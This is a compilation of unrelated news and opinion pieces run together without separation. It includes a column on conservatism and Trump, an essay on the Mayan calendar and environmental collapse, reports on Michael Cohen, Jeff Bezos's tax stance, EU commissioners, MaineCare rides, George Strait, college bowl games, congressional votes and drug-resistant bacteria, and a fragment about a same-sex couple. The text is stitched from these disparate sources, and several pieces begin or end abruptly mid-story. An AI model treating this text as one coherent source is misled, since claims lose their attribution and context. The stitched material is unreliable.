Conservatives said we agree with the general effort but think you’ve got human nature wrong. There never was such a thing as an autonomous, free individual who could gather with others to create order. Rather, individuals emerge out of families, communities, faiths, neighborhoods and nations. The order comes first. Individual freedom is an artifact of that order.
As Scruton put it in his bracing primer, “Conservatism: An Invitation to the Great Tradition,” “The question of which comes first, liberty or order, was to divide liberals from conservatives for the next 200 years.”
The practical upshot is that conservatives have always placed tremendous emphasis on the sacred space where individuals are formed. This space is populated by institutions like the family, religion, the local community, the local culture, the arts, the schools, literature and the manners that govern everyday life.
Membership in these institutions is not established by rational choice. We are born into them most of the time and are bonded to them by prerational cords of sympathy and affection. We gratefully inherit these institutions from our ancestors, we steward them and pass them along to our descendants.
Over the centuries conservatives have resisted anything that threatened this sacred space. First it was the abstract ideology of the French Revolution, the idea that society could be reorganized from the top down. Then it was industrialization. Conservatives like John Ruskin and later T. S. Eliot arose to preserve culture from the soulless pragmatism of the machine age.
Then it was the state. In their different ways, communists, fascists, social democrats and liberals tried to use the state to perform many functions previously done by the family, local civic organizations and the other players in the sacred space.
Conservatives fought big government not because they hated the state, per se, but because they loved the sacred space. The last attempts to build a conservatism around the sacred space were George W. Bush’s “compassionate conservatism” and, in Britain, David Cameron’s Big Society conservatism.
They both fizzled because over the last 30 years the parties of the right drifted from conservatism. The Republican Party became the party of market fundamentalism.
Market fundamentalism is an inhumane philosophy that makes economic growth society’s prime value and leaves people atomized and unattached. Republican voters eventually rejected market fundamentalism and went for the tribalism of Donald Trump because at least he gave them a sense of social belonging. At least he understood that there’s a social order under threat.
The problem is he doesn’t base his belonging on the bonds of affection conservatives hold dear. He doesn’t respect and obey those institutions, traditions and values that form morally decent individuals.
His tribalism is the evil twin of community. It is based on hatred, us/them thinking, conspiracy-mongering and distrust. It creates belonging, but on vicious grounds.
In 2018, the primary threat to the sacred order is no longer the state. It is a radical individualism that leads to vicious tribalism. The threat comes from those two main currents of the national Republican Party. At his essence Trump is an assault on the sacred order that conservatives hold dear — the habits and institutions that cultivate sympathy, honesty, faithfulness and friendship.
Today you can be a conservative or a Republican, but you can’t be both.
The new threats to the sacred space demand a fundamental rethinking for conservatives. You can’t do that rethinking if you are imprisoned in a partisan mind-set or if you dismiss half of Americans because they are on the “other team.”
When I look at places that are successfully nurturing beautiful communities, which seem most “conservative” in the true sense, I find great pluralism. Burlington, Vt., is doing it, and so is Salt Lake City. I find beautiful communities in places that consider themselves deep blue and places that consider themselves deep red.
The next conservatism will be built on the back of these real-life communities, and the way they nurture good citizens and healthy attachments. It will be based on new alliances, which have little to do with your father’s G.O.P.

Titanic World
This year, 2012, the Mayan calendar ends on the day before the december solstice. As I understand that, the end of an epoch, a very long time, maybe the time for our solar system to get once around its galaxy. The people of India had that kind of long view, I believe. Their epoch was 250,000 years--or was it 275,000 years? They too know we are in the last stage of a very long cycle.
The end of something, and presumably the beginning of another something.
I imagine that a majority of all humans by now must sense the end of something. Our planet has become a dangerous place, and almost all of us know all too well that we are the ones who have radically changed this planet. We, humankind, have amassed enormous powers that we have willfully applied to destroy at least half of all rainforests, have poisoned the air, the ground, and the water of this planet with our ferocious chemicals. It is we who have destroyed animal and plant habitats on every continent and so have caused the extinction of thousands, perhaps millions, of species of Life--a great danger for the planetary ecology: reducing biodiversity threatens the planetary ecology with collapse.
- Advertisement -
It is easy to see the end.
Much more difficult to see a new beginning.
If this year's end of an epoch were happening in a relatively normal period, the beginning would be something to look forward to, like Spring. An end to the cold and dormant state of winter, the vital juices of Life pushing up new everything.
- Advertisement -
But this is not a normal period; it is a period of extreme extremes. Humankind--and no science has ever questioned that we are one species--is more divided in every possible dimension than ever. However we can think of differences we have widened them. Life expectancy, health, size, skin color, morality, religion, nationality, ethnicity, wealth, power, etc. etc.
There are more humans than this planet can support, and at the same time a small minority of humans use five times what the planet provides, so that a majority of humans lives on the down side of the cliff. And it is the minority--actually a very small minority of that minority--that is continuing to poison the air, water and soil of this planet.
We have come to call our rulers the one percent, but 1% of 7,000,000,000 is 70 million: I doubt there are that many corporate owners in the world. The minority of the minority who are destroying the planet is much smaller. How many people does it take to drive one bulldozer, maintain that bulldozer, bring the fuel for that bulldozer that can destroy 10, 100 acres of virgin forest in a day. How many people does it take to overthrow a government, to negotiate a deal for "exploration and exploitation?" It takes one man and a few soldiers to aim and launch a nuclear missile halfway around the world, killing a million people, making a million square kilometers uninhabitable for the next 50,000 years.
We have allowed Exxon Mobile and Monsanto, and a few other corporations, to be wielders of magnitudes more power than they, or we, can responsibly handle.
Many of us know this but it is too late to change, and so, an unthinkable thought. So we tell ourselves "there is going to be a worldwide change of consciousness/" Presumably a change that makes it unthinkable to use the immense power we have appropriated.
Is that possible?.

Description President Donald Trump directed his longtime attorney Michael Cohen to lie to Congress about negotiations to build a Trump Tower in Moscow, according to two federal law enforcement officials involved in an investigation of the matter.
Trump also supported a plan, set up by Cohen, to visit Russia during the presidential campaign, in order to personally meet President Vladimir Putin and jump-start the tower negotiations. “Make it happen,” the sources said Trump told Cohen.
And even as Trump told the public he had no business deals with Russia, the sources said Trump and his children Ivanka and Donald Trump Jr. received regular, detailed updates about the real estate development from Cohen, whom they put in charge of the project.

Bezos considered launching Amazon on an Indian reservation to avoid paying taxes. | REUTERS
Bezos plays active role in tax fights
By BRIAN FALER
08/06/2013 02:53 PM EDT
Share on Facebook Share on Twitter
How much does new Washington Post owner Jeff Bezos hate taxes?
At one point, he thought about launching Amazon on an Indian reservation to avoid paying taxes. He parks profits in low-tax countries like Luxembourg and donated to the effort to defeat a Washington State ballot initiative that would have raised taxes on the wealthy.
Story Continued Below
Amazon spent $1.7 million during the first half of 2013 lobbying on issues that include a federal online sales tax bill and tax reform.
( PHOTOS: Jeff Bezos’s life and career)
In a letter to Post employees on Monday, Bezos said he wouldn’t interfere with the paper’s editorial coverage — but his libertarian-leaning views on taxes will certainly draw more scrutiny as he takes full ownership of the newspaper.
“The paper’s duty will remain to its readers and not to the private interests of its owners,” Bezos wrote.
When it comes to tax fights, Amazon is particularly active in efforts to impose levies on Internet sales transactions.
For many years, Amazon fought state governments attempting to force the online retailer to collect sales taxes. A 1992 Supreme Court decision declared that states could not require out-of-state companies to collect sales taxes when it sold to its residents if the business did not have a physical presence in the state.
( Also on POLITICO: What is Jeff Bezos thinking?)
Amazon responded by creating subsidiaries that owned its warehouses around the country, arguing that exempted them from those taxes, said Michael Mazerov, a fellow at the Center on Budget and Policy Priorities who’s tracked the issue.
“The law was ambiguous, the Supreme Court had never ruled on that issue and they were taking advantage of ambiguity in the law,” Mazerov said.
The company has since backpedaled, cutting deals with states to pay taxes where it has a physical presence, he said.
( Also on POLITICO: Bezos re-Kindles hope at WaPo)
That’s one reason why Amazon supports the Marketplace Fairness Act, a bill that cleared the Senate in May that would give all states the ability to collect sales tax from out-of-state online retailers. Now that Amazon has agreed to pay taxes in many states, it wants to ensure its competitors are subject to the same restrictions, Mazerov said.
“They want a level playing field,” he said.
On that point, Amazon and the Post are in agreement. The paper’s editorial board spoke out in support of the Marketplace Fairness Act in April.
“This will level the playing field for stores that have a physical presence, which are already charging tax on all local purchases,” the paper wrote. “That is fair for retailers, good for state budgets and even beneficial for consumers who would rather shop in person.”
The legislation is currently stalled in the House.
Some of Amazon’s tax practices have backfired. The company, for instance, received a sales tax waiver in exchange for bringing two distribution centers to Tennessee — including one that President Barack Obama visited last week.
Local businesses complained, saying it put them at a competitive disadvantage. Amazon eventually relented and will begin collecting taxes next year.
And though Amazon is based in Seattle, it’s kept significant profits in foreign low-tax jurisdictions like Luxembourg. But the strategy didn’t pay off. Amazon faced losses in some of those countries, leaving it subject to unusually high U.S. taxes on lopsided profits.
Though the statutory corporate tax rate is 35 percent, Amazon’s effective tax rate was almost 79 percent in 2012. The company has warned that it could again report an effective tax rate that is higher than the statutory maximum in 2013.

De Gucht to replace Michel
Belgian foreign minister Karel De Gucht to take over European Commission’s aid and development portfolio from Louis Michel.
European Voice
By	Toby Vogel	
7/8/09, 4:02 AM CET
Updated 4/12/14, 6:08 PM CET
The Belgian government has confirmed that Karel De Gucht, the foreign minister, is to succeed Louis Michel as the country’s European commissioner. Michel confirmed on Tuesday (7 July) that he would be leaving the Commission next Monday to take up a seat in the European Parliament the following day.
It is expected that De Gucht will take over from Michel the dossier of development and humanitarian aid, but the date on which he will start has not yet been fixed.
He will be the third replacement commissioner to arrive in recent weeks. Dalia Grybauskeitė left to become Lithuania’s president and was replaced by Algirdas Šemeta, who was until then the country’s finance minister. Danuta Hübner, Poland’s European commissioner, like Michel, stood in the European Parliament elections. She is being replaced as commissioner by Paweł Samecki, a member of the board of the National Bank of Poland.
Herman Van Rompuy, Belgium’s prime minister, had made it clear on 3 July that Belgium – which supports a strong European Commission – would not leave its seat at the Commission table empty for long. De Gucht said in an interview with the Flemish newspaper De Standaard that he had hesitated over whether to take the job, even after a conversation with Commission President José Manuel Barroso on 2 July. The foreign minister, who was yesterday accompanying the Belgian monarch, King Albert, on a state visit to Romania, said that leaving the post of foreign minister was “the most difficult decision” of his entire career.
But the prospects for the Flemish Liberals, De Gucht’s party, are limited. They are only junior partners in the federal government. Having suffered setbacks in last month’s regional elections, they will be left out of the regional government in Flanders and Brussels. De Gucht’s long-time ally, Guy Verhofstadt, has already made the switch to European politics, becoming an MEP and leader of the liberal group in the Parliament.
De Gucht was an MEP in 1980-94 and a member of the Flemish regional parliament in 1995-2003. He became foreign minister in 2004, when he was once again following Michel, who had just left to join the Commission.
As foreign minister he took a much harder line than Michel with some African leaders, notably Joseph Kabila, leader of the Democratic Republic of Congo, a former Belgian colony. He took a much tougher tone on respecting human rights and fighting corruption.
He was also considered a hard-liner in his party on immigration and the rights of asylum-seekers.
While De Gucht is expected to hold the development portfolio for the remainder of Barroso’s mandate, he will be given a new portfolio when the new Commission is formed at the end of the year.
Leaving the post of foreign minister was “the most difficult decision” of his entire career
Under a previous agreement, it is expected that a Flemish Christian Democrat (CD&V) will succeed De Gucht as Belgian foreign minister, quite likely Yves Leterme, a former Belgian prime minister.

Keeping it in the family
The profile of the EU’s oft-ignored Economic and Social Committee should soon soar following the election of no less a personality than Machiavelli as its chairwoman.
European Voice
10/21/98, 5:00 PM CET
Updated 4/12/14, 3:53 AM CET
Mrs Beatrice Rangoni Machiavelli is a direct descendant of the world's most famous political schemer and author of that essential guide to statesmanship, The Prince.
The modern Machiavelli is a journalist by profession and also represents the Italian consumers' council on the ESC.
It remains to be seen whether Mrs Machiavelli will follow the advice of her famous ancestor, who argued: "It is best for a ruler to be loved, but if he cannot be loved he must be feared."

Red faces over classic case of poor timing
Timing is everything. On the day when the European Commission launched a programme to support books and reading, it was also on the attack over the publication by Paul ‘whistleblower’ van Buitenen of a book detailing further cases of fraud and corruption in the EU executive.

The Commission denied it was trying to censure the man who brought Jacques Santer’s college to its knees, but asked the Dutchman to remove certain offending passages from the text.
Meanwhile, the Association of European Taxpayers was showering Van Buitenen with praise and gave him a whistleblowing award. One anonymous Commission official commented wryly: “Mr Van Buitenen deserves everything he gets.”

Who can, and can’t condemn, Israel’s war on Hamas
Chris Patten should consider his own country’s history and the report of an organisation he chairs before condemning Israel’s actions in Gaza.
European Voice
2/17/09, 10:33 AM CET
Updated 4/12/14, 5:24 PM CET
Chris Patten adopts a posture of moral admonition when he criticises Israel for using “disproportionate” force against Hamas (“Blind in Gaza and Jerusalem”, published on 26 January on EuropeanVoice.com).
Lord Patten may be right in his outline of the elements of a two-state solution but he is sadly wrong in his description of the fighting against Hamas as a war of “retribution and revenge”. Israel acted in self-defence. Regrettably, civilian losses are inevitable in any war and even more in an asymmetric war. Hamas was warned that its indiscriminate rocket attacks on Israeli towns must stop.
As the last British colonial governor, Lord Patten represents an empire that air bombed Palestinian villages in the 1930-s; area-bombed Dresden in the Second World War and killed thousands of civilians in suppressing uprisings in its colonies after the Second World War, especially in Kenya. While Britain did not hesitate to bomb cities in the Second World War, it refused to bomb the Nazi extermination camps.
Patten hardly strengthens his case by referring to Mahatma Gandhi, who criticised the “Biblical justification for retribution”, and the Turkish prime minister, who has called Israel’s attack “a crime against humanity”.
Strange as it may sound, Gandhi hesitated for years to express his position on the Jewish question. When he finally did so, at the request of Jewish friends who had been his associates in his struggle for Indian rights in South Africa, his statements were vague. The Jews were advised to practice “religious resistance” and suffer voluntarily at the hands of the Nazis.
If Patten believes in Gandhi’s non-violent methods, why doesn’t he call on Hamas to use them? Non-violent protests certainly didn’t work against the Nazis who were determined to exterminate the Jews, but they could work in the Middle East if Hamas’ only goal were end Israel’s occupation and live in peace with the state of Israel.
As regards Turkey, it could indeed play an important role in solving the conflict. Turkey should continue its mediation between Israel and Syria, and provide troops to support Egypt to stop the smuggling of weapons from Sinai into Gaza. Unfortunately, the Turkish prime minister is undermining this role by his unfounded statements.
Furthermore, Turkey is hardly in a better position than Patten to criticise Israel considering its own measures against its Kurdish minority: Forty thousand Kurds were killed during the civil war in 1984-99. Up to one million civilians were forcibly evicted from their villages. The majority of them are still internally displaced refugees.
As co-chair of International Crisis Group (ICG), Patten would be well advised to read its own reports. On 5 January, ICG issued very timely a policy briefing named “Ending the War in Gaza”. The only “retribution” exacted in the war was Hamas shooting the legs of those suspected of collaborating with Israel and killing Fatah supporters.
According to the report, Israel’s intelligence proved efficient, “targeting individual fighters’ homes, as well as mosques, houses and other locations where arms were stored and militants hid”. The report continues that Crisis Group for the first time heard public condemnation of Hamas that it was “provoking attacks on civilians by fighting from populated areas”.
With all his good intentions, Patten hasn’t even learned the lesson from nearby Northern Ireland. Peace there became possible only when IRA agreed to decommission its weapons and enter a power-sharing arrangement with the Protestant parties. How likely is it that Hamas will do the same and enter a national unity government with Fatah bent on a peaceful solution to the conflict?

LePage: We might keep troubled MaineCare rides contractor
He says all their contracts might not be renewed, but Democrats say the governor’s response to inadequate service doesn’t go far enough.
From staff and news services
Share
Read Article
AUGUSTA — Gov. Paul Le- Page said Thursday that it’s likely that not all of the contracts for the MaineCare rides coordinator that covers most of Maine will be renewed next year.
The state’s six contracts with Connecticut-based Coordinated Transportation Solutions run through Aug. 1, 2014. LePage said he doesn’t think the state will renew all six, but he left open the possibility that some might be renewed.
The governor did not elaborate on his statement, and his spokeswoman, Adrienne Bennett, did not return calls Thursday night.
Coordinated Transportation Solutions has been widely criticized because thousands of MaineCare patients have complained of missed or delayed rides. It has been on the equivalent of state probation since October, but until LePage made his comments to a group of reporters in his office Thursday, there was no indication what the state might do with the contracts.
The state has the authority to cancel the contracts at any time for any reason, according to contract language.
The Republican governor said he’s concerned about Coordinated Transportation Solutions, particularly the fact that the company didn’t obtain a performance bond, as required by its contract.
He said his administration is working with the company to continue to address the problems and is pleased with the progress that has been made since August, when the program started.
His comments were criticized by Democratic legislators as an inadequate response to persistent problems that have caused thousands of people to miss essential medical appointments.
They said the contractor is being given too much time to operate the program, considering all of the problems since the transportation service started in August of this year.
“We have to be more responsive than what I’ve seen,” said Sen. Colleen Lachowicz, D-Waterville. “People have missed crucial medical appointments, and that’s not OK.”
Before Maine started the system run by regional ride brokers, it operated the transportation program with a patchwork of local nonprofits arranging and providing service.
Lachowicz is sponsoring a bill that would force the state to switch to a Vermont-style system, similar to what Maine had before the contractors started in August. She said the bill, to be debated in January, is needed even if the administration cancels some of the contracts.
Lachowicz said Maine’s nonprofit transportation providers did a great job before Coordinated Transportation Solutions took over coverage of all of the state except the Bangor area and the York County region. She said the state should come up with a system that keeps them.
“It makes more sense to contract with our local providers in-state,” Lachowicz said. “We get to keep our tax dollars in state.”
Maine switched to the new system in response to federal guidelines that required the state to be more transparent in how it accounted for the rides. The U.S. Centers for Medicare and Medicaid Services is requiring more checks and balances in systems to prevent potential fraud and abuse.
Rep. Richard Farnsworth, D-Portland, House chairman of the Legislature’s Health and Human Services Committee, said he’s even more convinced that the Legislature must force changes to the Maine Department of Health and Human Services, primarily through Lachowicz’s bill.
Farnsworth said he cannot understand why the administration would continue working with Coordinated Transportation Solutions, considering the contractor’s shaky performance.
Even if some of the contracts are terminated, it gives the company far too much time to keep operating while people continue to miss rides to their appointments, Farnsworth said.
Coordinated Transportation Solutions has six separate one-year contracts, worth a total of $28.3 million, to serve six of eight regions in the state. Those regions do not include Bangor or York County.
David White, president of Coordinated Transportation Solutions, also could not be reached Thursday night. A recording on his office voicemail said White will be out of the office and unavailable through Monday.

Last stop for country superstar George Strait
Strait is retiring after a nearly 40-year career. He's had more songs top Billboard's country music charts than any musician in history.
By EMILY SCHMALLThe Associated Press

Read Article
ARLINGTON, Texas — It’s the end of the trail for country music king George Strait, who will wrap up his final tour Saturday with a star-filled show at the lavish home of the Dallas Cowboys in his home state of Texas.
The show brings an end to nearly 40 years on the road for Strait, which started in 1975 with the Ace in the Hole Band. And he plans to do it in style, inviting several of country’s biggest stars, including Miranda Lambert, Jason Aldean and Eric Church.
Additional Images
The Associated Press/Invision/Chris Pizzello This April 7, 2013 file photo shows George Strait performing at the 48th Annual Academy of Country Music Awards at the MGM Grand Garden Arena in Las Vegas. It’s the end of the trail for country music king George Strait, who will wrap up his final tour Saturday, June 7, with a star-filled show at the lavish home of the Dallas Cowboys in his home state of Texas.
Yet the focus will still be on the 62-year-old singer, who is beloved in country music with a career decades longer than most. He’s had more songs top Billboard’s country music charts than any other musician. And while he’s quitting the road, he may yet add to his chart-topping total after renewing his deal with MCA Records last year to produce five more albums.
“It’s a little bittersweet to know that some of these places, I’ll never go back to, never play again,” Strait said at a news conference at AT&T Stadium in September. “It’s sad for me, but I’m taking it all in and the crowd, they’re giving it to me.”
Strait’s 1981 single “Unwound” propelled him to stardom. His first No. 1 hit came the following year with “Fool Hearted Memory” and he’s now had 44 songs spend time atop Billboard’s country music rankings. He has more gold and platinum albums than any other artist except for Elvis Presley and The Beatles.
He’s just as successful on the road. His 584 shows since 1990 have grossed more than $405 million.
Born in Poteet and raised in Pearsall, about 60 miles southwest of San Antonio, Strait’s spare honky-tonk style, barroom ballads and cowboy dress helped inspire a generation of country music artists, including most who will share the stage Saturday night.
Tickets for Strait’s last show — his 46th performance of the two-year Cowboy Rides Away tour — were selling Friday for an average of $688 on the secondary market, according to TiqIQ.com.

Wildfire smoke clearing in Western states
Storms bring cooler and wetter weather into the region.
Associated Press
Share
Read Article
BOISE, Idaho — Storms brought cooler and wetter weather into the Western and Northwestern U.S. this weekend, breaking up a temperature inversion that had blanketed much of the region with acrid smoke from dozens of wildfires.
Officials at the National Interagency Fire Center in Boise said Saturday they expected fire activity to decrease over the next several weeks. Spokeswoman Kari Cobb said air quality should improve as the smoke-trapping inversion breaks up.
“We should see it lifting more today,” she said Saturday. “It’s predicted to be mostly gone by tomorrow in most of the West.”
She said that rain and higher humidity should decrease the chances of new fires.

Some schools have a bowl trip without the trip
While some games offer glitter and glamour in a new place, others, well, don't.
By TIM REYNOLDSAssociated Press
Share
Read Article
BOCA RATON, Fla. — Late Friday afternoon, Florida Atlantic loaded up its luggage and headed south to the hotel that will house the Conference USA champions for their bowl-game preparations.
It will be a four-mile drive.
The comforts of home await the Owls this weekend as they get ready to play in the Boca Raton Bowl, and they’re hardly the only team that won’t be seeing a new part of the country as part of the postseason perk package.
Miami, Navy and Memphis also are playing bowl games on their home fields, and five other teams – six if Georgia makes the College Football Playoff title game – will play bowls in their home states.
“A chance to stay home is really special, basically to have another home game,” said Florida Atlantic Coach Lane Kiffin, whose Owls essentially will host Akron in the Boca Raton Bowl. “From that advantage, it’s really neat. Our players obviously at first were like, ‘Well, we don’t get to go anywhere.’ But then when they really looked at it they realized, ‘Hey, we’re honored because we’re going to the best bowl there is for our conference.”‘
The Boca Raton Bowl is Tuesday, the first of the four de facto home games for some teams in this postseason. Navy is remaining in Annapolis, Maryland, for its bowl, the Dec. 28 Military Bowl against Virginia. Miami is headed to the Orange Bowl on Dec. 30, where Wisconsin awaits. And Memphis is off to the Liberty Bowl, set to meet Iowa State on Dec. 30.
Memphis had hopes of getting into a New Year’s Six bowl. When that didn’t happen after a loss to Central Florida in the American Athletic Conference title game, wide receiver Anthony Miller said going to the Liberty Bowl “was the next-best thing.”
“I don’t mind,” Miller said. “I just love the energy of being at the Liberty Bowl. I love being in Memphis. I love the fans. It’s my senior year. It’s my last year. I don’t think there’s a better way that I could end it.”
Florida Atlantic hasn’t been to a bowl game since 2008, so its upperclassmen all will attest that being home for a bowl obviously is better than being at home with no games left. The Military Bowl was thrilled to pit Navy against Virginia, given how the campuses are roughly 150 miles apart.
Miami ended a decade-long bowl-victory drought last season, rose to No. 2 in the rankings this season before dropping its final two games, and has reveled in how that success re-energized the fan base. The Hurricanes fell out of playoff contention with losses to Pittsburgh and Clemson, but one last night at home is more than a consolation prize.
“It’s going to be somewhat of a home game for us,” Coach Mark Richt said. “It is our home stadium. Our fans have been phenomenal all year long. It’s been one of the best turnouts of fans. … Even though we are home, in our home city, we know we’re going to get a chance to do some things we don’t normally get to do that the bowl will provide.”
Florida International, SMU, Texas, TCU and Wake Forest are also playing in-state bowls. SMU is going 28 miles for its game, Wake Forest is going 80 miles, and Texas Coach Tom Herman is going back to Houston – his former home.
“I think it’s neat,” Herman said. “It’s a city my family and myself have called home on a couple of different occasions, at Rice (and) at the University of Houston. … It is a city that I have a lot of friends and people that I know back there.”

How Maine’s members of Congress voted last week
The House passed the Student, Teachers, and Officers Preventing School Violence Act, which would modify and reauthorize the Secure Our Schools federal grant program for funding school security measures.

Along with roll call votes last week, the Senate also passed the Nick Castle Peace Corps Reform Act (S. 2286), to amend the Peace Corps Act to provide greater protection and services for Peace Corps volunteers; and the Eliminating Government-funded Oil-painting Act (S. 188), to prohibit the use of federal funds for the costs of painting portraits of officers and employees of the federal government.
The House also passed the State Veterans Home Adult Day Health Care Improvement Act (S. 324), to improve the provision of adult day health care services for veterans.
HOUSE VOTES
EXPERIMENTAL TREATMENTS FOR THE TERMINALLY ILL: The House has rejected the Trickett Wendler, Frank Mongiello, Jordan McLinn, and Matthew Bellina Right to Try Act (H.R. 5247), sponsored by Rep. Brian K. Fitzpatrick, R-Pa. The bill would have authorized investigational drug treatments for patients who have terminal illnesses expected to cause death within months. Fitzpatrick said expanding on the Food and Drug Administration’s current compassionate use program for such treatments could help establish “new pathways to potentially lifesaving treatment” for the terminally ill. A bill opponent, Rep. Frank Pallone Jr., D-N.J., said it was “based on the false premise that patients are not receiving access to the investigational treatments as a result of the Food and Drug Administration,” but the FDA already rapidly approved the vast majority of requests for investigational treatment while providing ways to protect patient safety. The vote, on March 13, was 259 yeas to 140 nays, with a two-thirds majority required for passage.
NAYS: Chellie Pingree, D-1st District
YEAS: Bruce Poliquin, R-2nd District
WESTERN ENDANGERED FISH SPECIES: The House has passed the Endangered Fish Recovery Programs Extension Act (H.R. 4465), sponsored by Rep. John R. Curtis, R-Utah, to authorize through 2023 recovery programs for endangered fish species in the Upper Colorado and San Juan River basins. Curtis said reauthorization through 2023 could give the programs enough time to take four fish species in the basins off the endangered species list. The vote, on March 13, was 392 yeas to 6 nays.
YEAS: Pingree, Poliquin
SECURITY AT SCHOOLS: The House has passed the Student, Teachers, and Officers Preventing School Violence Act (H.R. 4909), sponsored by Rep. John H. Rutherford, R-Fla., to modify and reauthorize through fiscal 2028 the Secure Our Schools federal grant program for funding school security measures. Rutherford highlighted measures in the bill to fund early intervention and violence prevention programs in schools as efforts “to give students, teachers, and law enforcement the tools and training they need to identify warning signs and to know who to contact” with information about potential threats. The vote, on March 14, was 407 yeas to 10 nays.
YEAS: Pingree, Poliquin
IMPACT OF FINANCIAL REGULATIONS: The House has passed the Taking Account of Institutions with Low Operation Risk Act (H.R. 1116), sponsored by Rep. Scott R. Tipton, R-Colo. The bill would require federal financial regulators to tailor their regulatory actions to limit burdens on the regulated institutions, with the requirement applied to both future regulatory actions and regulations adopted in the last seven years. Tipton said that forcing regulators to take often excessive compliance burdens into account would better enable community financial institutions to serve the lending needs of their customers. An opponent, Rep. Maxine Waters, D-Calif., criticized the bill’s use of a vague, undefined standard discussing a regulation’s impact on the regulated institution’s ability to serve evolving and diverse customer needs, and the lack of an offsetting “mandate that regulators consider the benefits of federal regulations” for consumers and financial stability. The vote, on March 14, was 247 yeas to 169 nays.
NAYS: Pingree
YEAS: Poliquin
FUNDRAISING BY SMALL COMPANIES: The House has passed the Regulation A+ Improvement Act (H.R. 4263), sponsored by Rep. Thomas MacArthur, R-N.J. The bill would raise the cap on the amount of securities funds that can be raised by small companies under the Securities and Exchange Commission’s A+ rule from $50 million to $75 million. MacArthur said the higher cap, by allowing for larger sales of stock in private growing companies, would promote the flow of capital to young firms that are creating new jobs and boosting the economy. A bill opponent, Rep. Maxine Waters, D-Calif., said the higher cap would put “mom-and-pop investors” at risk of losing the money they invest in small companies. The vote, on March 15, was 246 yeas to 170 nays.
NAYS: Pingree
YEAS: Poliquin
APPEALING FINANCIAL REGULATORY EXAMS: The House has passed the Financial Institutions Examination Fairness and Reform Act (H.R. 4545), sponsored by Rep. Scott R. Tipton, R-Colo. The bill would establish the Office of Independent Examination Review, to consider complaints by financial institutions about the results of examinations of their financial health carried out by the Bureau of Consumer Financial Protection. Tipton said community banks and credit unions in particular needed an impartial venue for appealing exam results, and the Office would provide that venue, giving them greater regulatory certainty. A bill opponent, Rep. Emanuel Cleaver, D-Mo., said the appeals process would excessively favor banks whose reckless behavior caused the financial crisis a decade ago by shielding them from “effective, prudential, and consumer protection supervision.” The vote, on March 15, was 283 yeas to 133 nays.
NAYS: Pingree
YEAS: Poliquin
SENATE VOTES
CUTTING FINANCIAL REGULATIONS: The Senate has passed the Economic Growth, Regulatory Relief, and Consumer Protection Act (S. 2155), sponsored by Sen. Mike Crapo, R-Idaho. The bill would waive certain regulations for financial institutions that have less than $10 billion in assets and change other regulations of consumer credit and the banking system. Crapo said the measures aimed to improve economic growth, provide regulatory relief, and increase consumer protections. An opponent, Sen. Bernie Sanders, ID-Vt., called the bill a move to deregulate some of the banks responsible for the 2007-2009 financial crisis, making it “more likely that we will see another financial crisis, another taxpayer bailout, and massive dislocation of our economy.” The vote, on March 14, was 67 yeas to 31 nays.
YEAS: Susan Collins, R-Maine; Angus King, I-Maine

‘Nightmare bacteria’ pose growing threat
The number of cases of the drug-resistant bacteria showing up last year was higher than expected.
Associated Press
Share
Read Article
“Nightmare bacteria” with unusual resistance to antibiotics of last resort were found more than 200 times in the United States last year in a first-of-a-kind hunt to see how much of a threat these rare cases are becoming, health officials said Tuesday.
That’s more than they had expected to find, and the true number is probably higher because the effort involved only certain labs in each state, officials say.

The problem mostly strikes people in hospitals and nursing homes who need IVs and other tubes that can get infected. In many cases, others in close contact with these patients also harbored the superbugs even though they weren’t sick – a risk for further spread.
Some of the sick patients had traveled for surgery or other health care to another country where drug-resistant germs are more common, and the superbug infections were discovered after they returned to the U.S.
“Essentially, we found nightmare bacteria in your backyard,” said Dr. Anne Schuchat, principal deputy director of the U.S. Centers for Disease Control and Prevention.
“These verge on untreatable infections” where the only option may be supportive care – fluids and sometimes machines to maintain life to give the patient a chance to recover, Schuchat said.

The R&A issues warning about buying unofficial hospitality at The Open
Thursday 14 April 2016
Ahead of The 145TH Open at Royal Troon this July and next year’s Championship at Royal Birkdale, The R&A has issued a warning to protect spectators against unofficial hospitality suppliers.
Spectators looking to purchase hospitality places should be cautious of unofficial suppliers offering hospitality packages claiming to be on the course, which in reality may be located several miles away from the venue.
Official hospitality packages incorporate fraud prevention measures including a ticket barcode on the hospitality pass, which is something unofficial suppliers cannot provide.
Spectators risk being denied entry to the course if they are using a ticket purchased on their behalf by an unofficial supplier.
Official ticket-inclusive hospitality packages can be purchased through The Open’s hospitality programme at www.TheOpen.com/Hospitality
The Open has partnered with a number of third party suppliers to sell official hospitality packages on their behalf. Verified third party suppliers are listed at www.TheOpen.com/buyofficialhospitality
Official hospitality packages sold by The Open hospitality team and verified third party agents are the only experiences that include on-course hospitality inside the gates and a guaranteed entry ticket. Purchasing official hospitality helps to support golf development programmes in the UK and around the world.
Johnnie Cole-Hamilton, Executive Director – Championships at The R&A, said, “The Open is truly a celebration of sport and to be part of the celebration, we are urging all fans to be vigilant and carefully scrutinise hospitality packages on offer to ensure it is very clear what they are going to receive when they arrive on the day.
“We are committed to providing the best possible experience for everyone that attends The Open and we have learned in the past that some suppliers will look to exploit the excitement surrounding the Championship by attempting to mislead our spectators.”
Spectators in any doubt about a package they have purchased should contact The Open Hospitality team on +44 (0) 844 371 0883, email Hospitality@TheOpen.com or visit www.TheOpen.com/Hospitality for further information.

List Rules American leaders only. Note: "Most important" or "most influential" does not equal "best."
List of the most important leaders in U.S. history. Love 'em or hate 'em, these leaders shaped American history from its founding through today. Men and women who have truly defined America through their work and leadership, even if it did not mean serving political office, are ranked here on this master list of leaders. Pioneers who changed the landscape, from the Civil Rights Movement, to Women's Suffrage, to the atom bomb, appear on this list of American leaders who changed the world.
The most important American presidents are ranked here, like Harry S. Truman and George Washington to name a few, along with First Ladies like Eleanor Roosevelt. Industry leaders like Andrew Carnegie and John D. Rockefeller cannot be overlooked, nor can leaders who were not in the U.S. government itself, such as Martin Luther King, Jr. and Susan B. Anthony.
Leadership takes many forms throughout American history, and famous American leaders pervade all of history, but this list gives props to those who were the most influential. Vote up the most important U.S. leaders below, or if the United States is too small for you, make sure to peruse this list of The Most Important Leaders in World History.

The Supreme Court may have decided that same-sex marriage should be legal, but other laws that discriminate against same-sex couples have struggled to catch up. The fear Democratic presidential candidates have spoken about is that a couple can marry on a weekend, post their photos to Facebook and be fired on Monday morning after being outed. That’s nearly what happened to a beloved couple in Tennessee.
Dennis Clark and Mark Henderson both joined the Freemasons in 2007 because they valued the two requirements: a belief in a higher power and community service work. Clark told WKNOP that they both loved the idea of the fraternity of men coming together to do charity and community work.
